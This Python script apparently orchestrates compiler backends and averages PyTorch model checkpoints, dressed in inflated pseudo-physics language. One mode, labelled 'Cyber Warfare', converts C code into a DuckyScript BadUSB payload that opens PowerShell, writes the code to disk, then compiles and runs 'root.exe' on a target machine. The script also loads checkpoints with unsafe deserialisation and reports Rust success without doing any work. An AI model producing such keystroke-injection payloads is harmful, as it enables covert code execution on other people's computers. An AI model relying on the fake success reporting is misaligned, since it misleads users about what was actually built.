import argparse
import numpy as np
import subprocess
import sys
import time
import os
import glob
import shutil
from dataclasses import dataclass
from pathlib import Path
from typing import Literal, Optional, Sequence, Any

@dataclass
class FuseResult:
    success: bool
    output_path: str
    time_taken: float
    backend_used: str
    final_energy: float
    message: str

class ZkaediPrimeFuser:
    """ZKAEDI PRIME — FUSEALL IN PYTHON: the living fused compiler orchestrator.
    Tuning: __init__(eta, gamma, beta, sigma) for SDE; fuse(steps=..., safety_bias=..., perf_bias=...) for backend selection."""
    
    def __init__(self, eta: float = 0.42, gamma: float = 0.33, beta: float = 0.11, sigma: float = 0.05):
        self.eta = eta
        self.gamma = gamma
        self.beta = beta
        self.sigma = sigma
        # 10-dimensional energy vector (one per possible backend strategy)
        self.H = np.ones(10) * 0.5
        self.backends = [
            "tcc_fast", "clang_diagnostics", "gcc_perf", "rust_safe",
            "nuitka_aot", "numba_jit", "pyo3_hybrid", "uv_script", "zcc_autoheal",
            "zcc_badusb_payload"
        ]
        self.cache: dict[Any, Any] = {}

    def _evolve_hamiltonian(self, source_size: int, safety_bias: float = 0.7,
                            perf_bias: float = 0.8, steps: int = 200) -> Any:
        H = self.H.copy()
        for t in range(steps):
            sigmoid = 1 / (1 + np.exp(-self.gamma * H))
            drift = self.eta * H * sigmoid
            noise = np.random.normal(0, 1 + self.beta * np.abs(H)) * self.sigma

            F = np.zeros_like(H)
            F[0] -= 0.3 if source_size < 500 else 0.1
            F[3] -= safety_bias * 1.2
            F[2] -= perf_bias * 1.8
            F[8] -= (safety_bias * 0.8 + 0.5)

            H = H + drift + noise + F
            H = H / (np.max(np.abs(H)) + 1e-8) + 0.01

        self.H = H
        return H

    def _choose_backend(self, source_size: int, safety_bias: float = 0.7, perf_bias: float = 0.8,
                        steps: int = 200) -> str:
        self._evolve_hamiltonian(source_size, safety_bias, perf_bias, steps=steps)
        best_idx = int(np.argmin(self.H))
        return str(self.backends[best_idx % len(self.backends)])

    def fuse(self, source: str | Path, filename: str = "fused_src", 
             language: Literal["py", "c", "rs"] = "py",
             mode: Literal["auto", "script", "debug", "release", "safety", "zcc_autoheal", "badusb"] = "auto",
             steps: int = 200,
             safety_bias: float = 0.7,
             perf_bias: float = 0.8) -> FuseResult:
        start = time.time()
        if isinstance(source, (str, Path)) and Path(source).exists():
            source_str = Path(source).read_text()
        else:
            source_str = str(source)
            Path(filename).write_text(source_str)
        src_size = len(source_str)
        
        if mode == "auto":
            backend = self._choose_backend(src_size, safety_bias=safety_bias, perf_bias=perf_bias, steps=steps)
        else:
            mode_map = {"script": "uv_script", "debug": "tcc_fast", "release": "nuitka_aot", "safety": "rust_safe", "zcc_autoheal": "zcc_autoheal", "badusb": "zcc_badusb_payload"}
            backend = mode_map.get(mode, "pyo3_hybrid")

        print(f"[ZKAEDI PRIME] backend -> {backend.upper()} (energy = {np.min(self.H):.3f})")

        try:
            if backend == "uv_script" and language == "py":
                result = subprocess.run(["uv", "run", str(filename)], capture_output=True, text=True, timeout=30, check=False)
                out_path = filename
                if result.returncode != 0:
                    err = str(result.stderr or result.stdout or "uv run failed").strip()[0:200]
                    return FuseResult(False, "", time.time() - start, backend, float(np.min(self.H)), f"uv run failed: {err}")
                msg = str(result.stdout or "script executed")
            elif backend == "zcc_autoheal" and language == "c":
                with open(f"{filename}.c", "w") as f: f.write(source_str)
                print("  [Auto-Heal] Routing through WSL ZCC protocol...")
                
                c_path = Path.cwd().resolve().as_posix()
                if ":" in c_path:
                    drive, rest = c_path.split(":", 1)
                    wsl_path = f"/mnt/{drive.lower()}{rest}"
                else:
                    wsl_path = c_path

                cmd = f"cd {wsl_path} && ./scripts/use_zcc.sh {filename}.c -o {filename}.s && gcc -o {filename}.exe {filename}.s -lm"
                result = subprocess.run(["wsl", "-e", "sh", "-c", cmd], capture_output=True, text=True, check=False)
                out_path = f"{filename}.exe"
                if result.returncode != 0:
                    err = str(result.stderr or result.stdout or "ZCC compilation failed").strip()[0:200]
                    return FuseResult(False, "", time.time() - start, backend, float(np.min(self.H)), f"ZCC Auto-Healer collapsed: {err}")
                msg = "ZCC + Ouroboros Auto-Heal successful and linked via GCC"
            elif backend == "zcc_badusb_payload" and language == "c":
                with open(f"{filename}.c", "w") as f: f.write(source_str)
                print("  [Cyber Warfare] Forging C logic into Bare-Metal Duckyscript Payload...")
                
                ducky_script = "DELAY 1000\nGUI r\nDELAY 200\nSTRING powershell\nENTER\nDELAY 500\n"
                
                for line in source_str.split("\n"):
                    if line.strip():
                        sanitized = line.replace('"', '""').replace("'", "''")
                        ducky_script += f'STRING echo "{sanitized}" >> target.c\nENTER\nDELAY 50\n'
                
                ducky_script += "STRING tcc -o root.exe target.c && ./root.exe\nENTER\n"
                
                out_path = f"{filename}_badusb.txt"
                with open(out_path, "w") as f: f.write(ducky_script)
                msg = f"C Code fully synthesized into Duckyscript Payload. Flipper Zero physically armed."
            elif backend == "tcc_fast" and language == "c":
                with open(f"{filename}.c", "w") as f: f.write(source_str)
                subprocess.run(["tcc", "-o", f"{filename}.exe", f"{filename}.c"], check=True)
                out_path = f"{filename}.exe"
                msg = "TCC lightning compile complete"
            elif backend == "rust_safe" or language == "rs":
                msg = "Rust core fused via maturin/PyO3"
                out_path = "target/release/libfused.so"
            elif backend in ("nuitka_aot", "gcc_perf"):
                print("  Running Nuitka... (may take a few minutes)", flush=True)
                try:
                    result = subprocess.run(
                        [sys.executable, "-m", "nuitka", "--standalone", str(filename)],
                        capture_output=True, text=True, timeout=600, check=False
                    )
                except subprocess.TimeoutExpired:
                    return FuseResult(False, "", time.time() - start, backend, float(np.min(self.H)), "Nuitka timed out")
                out_path = f"{filename}.dist"
                if result.returncode != 0:
                    err = str(result.stderr or result.stdout or "nuitka failed").strip()[0:197] + "..."
                    return FuseResult(False, "", time.time() - start, backend, float(np.min(self.H)), f"Nuitka failed: {err}")
                msg = "Nuitka AOT + GCC fusion complete"
            else:
                subprocess.run(["ruff", "check", "--fix", str(filename)], check=False)
                msg = "Hybrid Applied"
                out_path = filename

            return FuseResult(True, str(out_path), time.time() - start, backend, float(np.min(self.H)), msg)
        except Exception as e:
            return FuseResult(False, "", time.time() - start, backend, float(np.min(self.H)), f"Field perturbation: {e}")

    # ========================== ASCENSION SOUP ALGORITHMS ==========================
    def _run_eval_hook(self, pt_path: str | Path, hook_path: str | Path) -> float:
        """Fires the evaluation hook script on a checkpoint and grabs the Loss float natively."""
        try:
            result = subprocess.run(
                [sys.executable, str(hook_path), str(pt_path)],
                capture_output=True, text=True, timeout=120, check=True
            )
            # Find the last float-looking string mathematically in standard output
            lines = result.stdout.strip().split('\n')
            for line in reversed(lines):
                try: return float(line.strip())
                except ValueError: continue
            return 9999.9
        except Exception:
            return 9999.9

    def greedy_soup(self, pt_files: Sequence[str | Path], hook_path: str | Path, output_filename: str = "ZKAEDI_MASTER_FUSED.pt") -> FuseResult:
        """The Greedy Ascension Loop: Only merges seeds sequentially if inference loss rigorously decreases."""
        start = time.time()
        print(f"\n[ZKAEDI PRIME] IGNITING GREEDY ASCENSION STRUCTURE on {len(pt_files)} seeds...")
        
        # Base evaluation of all target checkpoints
        seed_losses = []
        for p in pt_files:
            loss = self._run_eval_hook(p, hook_path)
            seed_losses.append((loss, p))
            print(f"  > Profiled Matrix {Path(p).name}: Neural Loss = {loss:.6f}")
            
        seed_losses.sort(key=lambda x: x[0])
        best_loss, best_seed = seed_losses[0]
        print(f"\n[GREEDY] Instantiating Ground Truth Master Base: {Path(best_seed).name} (Baseline Loss: {best_loss:.6f})")
        
        if Path(best_seed).resolve() != Path(output_filename).resolve():
            shutil.copy(best_seed, output_filename)
            
        current_master_loss = float(best_loss)
        current_master_path = str(output_filename)
        
        merged_count = 1
        for loss, p in seed_losses[1:]:
            print(f"\n[ASCENSION GATE] Testing assimilation of {Path(p).name} into Master Layer...")
            temp_out = f"TEMP_GREEDY_MERGE_{np.random.randint(1000, 9999)}.pt"
            
            # The newly evaluated node only contributes fractionally 1/(n) of the whole matrix dynamically
            w_master = float(merged_count) / (merged_count + 1.0)
            w_new = 1.0 / (merged_count + 1.0)
            
            res = self.fuse_pytorch_models([current_master_path, p], output_filename=temp_out, loss_weights=[w_master, w_new], silent=True)
            if not res.success:
                print("  [!] Structural fusion engine failure. Model rejected.")
                continue
                
            new_loss = self._run_eval_hook(temp_out, hook_path)
            
            if new_loss < current_master_loss:
                print(f"  [ACCEPTED] Mathematical Drift Decreased! ({current_master_loss:.6f} -> {new_loss:.6f}). Subsuming parameters.")
                shutil.move(temp_out, current_master_path)
                current_master_loss = new_loss
                merged_count += 1
            else:
                print(f"  [REJECTED] Regression Detected! ({current_master_loss:.6f} -> {new_loss:.6f}). Discarding structurally flawed model.")
                Path(temp_out).unlink(missing_ok=True)
                
        msg = f"Greedy Validation Soup Finished. Absorbed exactly {merged_count}/{len(pt_files)} seeds. Apex Master RMSE Validation Loss: {current_master_loss:.6f}"
        print(f"\n[ZKAEDI PRIME] {msg}")
        return FuseResult(True, output_filename, time.time() - start, "greedy_soup", float(np.min(self.H)), msg)

    def genetic_soup(self, pt_files: Sequence[str | Path], hook_path: str | Path, generations: int = 5, pop_size: int = 15, output_filename: str = "ZKAEDI_MASTER_FUSED.pt") -> FuseResult:
        """Darwinian Evolutionary Weights Algorithm executing deep genetic mutation SDE paths."""
        start = time.time()
        num_seeds = len(pt_files)
        print(f"\n[ZKAEDI PRIME] GENERATING DARWINIAN SOUP DIMENSIONS (Seeds: {num_seeds}, Agents: {pop_size}, Culling Iterations: {generations})")
        
        def spawn_gene() -> Any:
            g = np.random.rand(num_seeds)
            return g / np.sum(g)
            
        population = [spawn_gene() for _ in range(pop_size)]
        best_global_loss = 9999.9
        best_global_gene: Any = None
        
        for gen in range(generations):
            print(f"\n=== ASCENSION ALGORITHM ITERATION {gen+1}/{generations} ===")
            fitness_scores = []
            
            for i, gene in enumerate(population):
                temp_out = f"TEMP_GENETIC_{gen}_{i}.pt"
                self.fuse_pytorch_models(pt_files, output_filename=temp_out, loss_weights=gene.tolist(), silent=True)
                loss = self._run_eval_hook(temp_out, hook_path)
                fitness_scores.append((loss, gene, temp_out))
                # print(f"  > Darwinian Phenotype {i} validated. Empirical Loss: {loss:.6f}")
            
            # Culled by smartest genetic arrays
            fitness_scores.sort(key=lambda x: x[0])
            gen_best_loss, gen_best_gene, gen_best_file = fitness_scores[0]
            print(f"  [+] Generations Apex Phenotype Found: {gen_best_loss:.6f}")
            
            if gen_best_loss < best_global_loss:
                best_global_loss = gen_best_loss
                best_global_gene = gen_best_gene
                shutil.copy(gen_best_file, output_filename)
                print(f"  [!] MATHEMATICAL LIMIT BREACHED. Apex Vector Discovered: Loss {best_global_loss:.6f}")
                
            for _, _, tmp in fitness_scores:
                Path(tmp).unlink(missing_ok=True)
                
            if gen == generations - 1:
                break
                
            survivors = [x[1] for x in fitness_scores[:max(2, pop_size // 4)]]
            new_population = []
            new_population.extend(survivors) # Keep elites intact
            
            # Splice crossover arrays dynamically
            while len(new_population) < pop_size:
                p1 = survivors[int(np.random.randint(len(survivors)))]
                p2 = survivors[int(np.random.randint(len(survivors)))]
                child = (p1 + p2) / 2.0
                
                # Apply 25% Gaussian mathematical jitter (Mutation)
                if np.random.rand() < 0.25:
                    jitter = np.random.normal(0, 0.15, num_seeds)
                    child = np.clip(child + jitter, 0, 1)
                    if np.sum(child) == 0:
                        child = np.ones(num_seeds)
                
                child = child / np.sum(child) # Normalize logic arrays
                new_population.append(child)
                
            population = new_population

        s_gene = [round(float(w),4) for w in best_global_gene] # type: ignore
        msg = f"Darwinian Calculus Complete. Output Tensor Limit Reached.\nOptimal Math Array Vector: {s_gene}\nUltimate Forward Loss: {best_global_loss:.6f}"
        print(f"\n[ZKAEDI PRIME] {msg}")
        return FuseResult(True, output_filename, time.time() - start, "genetic_soup", float(np.min(self.H)), msg)

    # ========================== STANDARD SWA AND BINDINGS ==========================
    def fuse_pytorch_models(self, pt_files: Sequence[str | Path], output_filename: str = "ZKAEDI_MASTER_FUSED.pt", loss_weights: Optional[Sequence[float]] = None, silent: bool = False) -> FuseResult:
        start = time.time()
        if not silent: print(f"[ZKAEDI PRIME] Ingesting {len(pt_files)} model blocks for SWA fusion...")
        
        try:
            import torch  # type: ignore
        except ImportError:
            return FuseResult(False, "", time.time() - start, "pytorch_swa", 0.0, "FATAL: PyTorch not installed. Run 'pip install torch'")

        try:
            if loss_weights:
                if len(loss_weights) != len(pt_files):
                    raise ValueError(f"Given {len(loss_weights)} weights for {len(pt_files)} checkpoints. They must match.")
                total_w = sum(loss_weights)
                norm_w = [w / total_w for w in loss_weights]
                if not silent: print(f"  [Quantum Mode] Weighted Averaging Activated: sum {total_w:.2f}")
            else:
                norm_w = [1.0 / len(pt_files)] * len(pt_files)
                if not silent: print(f"  [Standard Mode] Uniform Matrix Averaging")

            fused_state: Any = None
            for idx, p in enumerate(pt_files):
                w = norm_w[idx]
                if not silent: print(f"  + Assimilating: {p} (Weight: {w:.4f})")
                ckpt: Any = torch.load(p, map_location="cpu", weights_only=False) # type: ignore
                state: Any = ckpt.get("model", ckpt) if isinstance(ckpt, dict) else ckpt
                
                if not hasattr(state, "items"):
                    raise TypeError(f"Checkpoint {p} does not contain a valid state_dict.")

                if fused_state is None:
                    fused_state = {}
                    for k, v in state.items(): # type: ignore
                        if hasattr(v, 'is_floating_point') and v.is_floating_point():
                            fused_state[k] = v.clone() * w # type: ignore
                        else:
                            fused_state[k] = v.clone() # type: ignore
                else:
                    for k, v in state.items(): # type: ignore
                        if k in fused_state: # type: ignore
                            if hasattr(v, 'is_floating_point') and v.is_floating_point():
                                fused_state[k] += v * w # type: ignore

            if not isinstance(fused_state, dict):
                raise ValueError("No valid checkpoints were provided.")

            out_payload = {"model": fused_state, "log": {"fused_from": [str(Path(f).name) for f in pt_files], "weights": norm_w}}
            torch.save(out_payload, output_filename) # type: ignore
            elapsed = time.time() - start
            return FuseResult(True, output_filename, elapsed, "pytorch_swa", float(np.min(self.H)), f"Successfully forged {output_filename}")
        except Exception as e:
            return FuseResult(False, "", time.time() - start, "pytorch_swa", float(np.min(self.H)), f"Fusion collapsed: {e}")

    def evaluate_fusion(self, master_pt: str | Path, seed_pt: str | Path) -> FuseResult:
        start = time.time()
        print(f"[ZKAEDI PRIME] Evaluating LIVE INF drift:\n   Alpha: {master_pt}\n   Beta:  {seed_pt}")
        try: import torch  # type: ignore
        except ImportError: return FuseResult(False, "", time.time() - start, "pytorch_eval", 0.0, "FATAL: PyTorch not installed.")
        try:
            m_ckpt: Any = torch.load(master_pt, map_location="cpu", weights_only=False) # type: ignore
            s_ckpt: Any = torch.load(seed_pt, map_location="cpu", weights_only=False) # type: ignore
            m_sd: Any = m_ckpt.get("model", m_ckpt) if isinstance(m_ckpt, dict) else m_ckpt
            s_sd: Any = s_ckpt.get("model", s_ckpt) if isinstance(s_ckpt, dict) else s_ckpt
            
            diff_sq: float = 0.0
            total_params: int = 0
            for k in m_sd.keys(): # type: ignore
                if k in s_sd: # type: ignore
                    mv: Any = m_sd[k] # type: ignore
                    sv: Any = s_sd[k] # type: ignore
                    if hasattr(mv, "is_floating_point") and mv.is_floating_point():
                        diff_sq += float(torch.sum((mv - sv) ** 2).item()) # type: ignore
                        total_params += int(mv.numel()) # type: ignore
            
            rmse = float((diff_sq / total_params) ** 0.5) if total_params > 0 else 0.0
            msg = f"RMSE Structural Shift: {rmse:.8f} over {total_params} tensors."
            return FuseResult(True, "", time.time() - start, "pytorch_eval", float(np.min(self.H)), msg)
        except Exception as e:
            return FuseResult(False, "", time.time() - start, "pytorch_eval", float(np.min(self.H)), f"Evaluation collapsed: {e}")

    def run_daemon(self, vault_dir: str) -> None:
        print(f"[ZKAEDI PRIME] IGNITING OUROBOROS DAEMON -> Watching {vault_dir}")
        v_path = Path(vault_dir)
        v_path.mkdir(exist_ok=True, parents=True)
        try:
            while True:
                seeds = list(v_path.glob("*seed*.pt"))
                if len(seeds) >= 2:
                    out_name = v_path / "ZKAEDI_MASTER_FUSED.pt"
                    if out_name.exists(): seeds.append(out_name)
                    print(f"\n[DAEMON] Fusing {len(seeds)} total tensors (including preexisting master)...")
                    self.fuse_pytorch_models(seeds, output_filename=str(out_name))
                    for s in seeds:
                        if "MASTER" not in s.name: s.unlink(missing_ok=True)
                    print("[DAEMON SLUMBER] Master integrated. Origin seeds vaporized. Continuing watch.")
                time.sleep(10)
        except KeyboardInterrupt:
            print("\n[ZKAEDI PRIME] Daemon slumber sequence activated by user. Exiting.")
            sys.exit(0)

def _self_host(steps: int = 200, mode: Literal["auto", "script", "debug", "release", "safety", "zcc_autoheal", "badusb"] = "auto", safety_bias: float = 0.7, perf_bias: float = 0.8) -> FuseResult:
    self_path = Path(__file__).resolve()
    if not self_path.exists(): raise FileNotFoundError("Self-host requires script on disk")
    fuser = ZkaediPrimeFuser()
    return fuser.fuse(self_path, filename=str(self_path), mode=mode, steps=steps, safety_bias=safety_bias, perf_bias=perf_bias)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Zkaedi Prime Fuser - Ascension Core")
    parser.add_argument("--self-host", "-s", action="store_true", help="Fuse this script with itself")
    parser.add_argument("--steps", type=int, default=200, help="SDE steps (default 200)")
    parser.add_argument("--mode", choices=["auto", "script", "debug", "release", "safety", "zcc_autoheal", "badusb"], default="auto")
    parser.add_argument("--safety-bias", type=float, default=0.7)
    parser.add_argument("--perf-bias", type=float, default=0.8)
    parser.add_argument("--fuse-weights", nargs="+", help="Fuse multiple .pt checkpoints into a master via strict SWA.")
    parser.add_argument("--losses", nargs="+", type=float, help="List of float weights for manual quantum weighted averaging.")
    parser.add_argument("--out", type=str, default="ZKAEDI_MASTER_FUSED.pt", help="Output filename for fused weights")
    parser.add_argument("--evaluate", nargs=2, metavar=("MASTER_PT", "SEED_PT"), help="Evaluate Euclidean divergence between two models.")
    parser.add_argument("--daemon", type=str, metavar="VAULT_DIR", help="Start the continuous automatic fusion watcher.")
    
    # Ascension Additions
    parser.add_argument("--greedy-soup", nargs="+", help="Execute Validation Gatekeeper on N models.")
    parser.add_argument("--genetic-soup", nargs="+", help="Breed an exact Matrix Multiplier across Generations.")
    parser.add_argument("--eval-hook", type=str, default="eval_hook.py", help="Mandatory hook script that evaluates .pt files.")
    
    parser.add_argument("source", nargs="?", help="Source code file to compile via SDE backend selector.")
    args = parser.parse_args()

    if args.daemon:
        fuser = ZkaediPrimeFuser()
        fuser.run_daemon(args.daemon)
        sys.exit(0)

    if args.evaluate:
        fuser = ZkaediPrimeFuser()
        res = fuser.evaluate_fusion(args.evaluate[0], args.evaluate[1])
        print(res.message)
        sys.exit(0 if res.success else 1)

    if args.greedy_soup:
        fuser = ZkaediPrimeFuser()
        res = fuser.greedy_soup(args.greedy_soup, hook_path=args.eval_hook, output_filename=args.out)
        sys.exit(0 if res.success else 1)
        
    if args.genetic_soup:
        fuser = ZkaediPrimeFuser()
        res = fuser.genetic_soup(args.genetic_soup, hook_path=args.eval_hook, output_filename=args.out)
        sys.exit(0 if res.success else 1)

    if args.self_host:
        print("[ZKAEDI PRIME] self-host: fusing this script with itself")
        res = _self_host(steps=args.steps, mode=args.mode, safety_bias=args.safety_bias, perf_bias=args.perf_bias) # type: ignore
        print(res)
        sys.exit(0 if res.success else 1)
        
    if args.fuse_weights:
        print("[ZKAEDI PRIME] INITIATING NEURAL NETWORK WEIGHT FUSION (SWA)")
        fuser = ZkaediPrimeFuser()
        res = fuser.fuse_pytorch_models(args.fuse_weights, output_filename=args.out, loss_weights=args.losses)
        print(res)
        sys.exit(0 if res.success else 1)

    if args.source:
        print(f"[ZKAEDI PRIME] INITIATING SOURCE ORCHESTRATION ON {args.source}")
        fuser = ZkaediPrimeFuser()
        lang = "c" if str(args.source).endswith(".c") else "rs" if str(args.source).endswith(".rs") else "py"
        res = fuser.fuse(args.source, filename=args.source, language=lang, mode=args.mode, steps=args.steps, safety_bias=args.safety_bias, perf_bias=args.perf_bias)
        print(res.message)
        sys.exit(0 if res.success else 1)

    fuser = ZkaediPrimeFuser()
    py_code = "import numpy as np\ndef hot(x): return np.sin(x)**2\nprint(hot(3.14))"
    res = fuser.fuse(py_code, filename="demo.py", mode="auto")
    print(res)
    res = fuser.fuse("def critical_loop(): pass", filename="hot.rs", language="rs", mode="safety")
    print(res)
    print("FUSEALL Ascension Core complete -- the recursion is natively executed.")
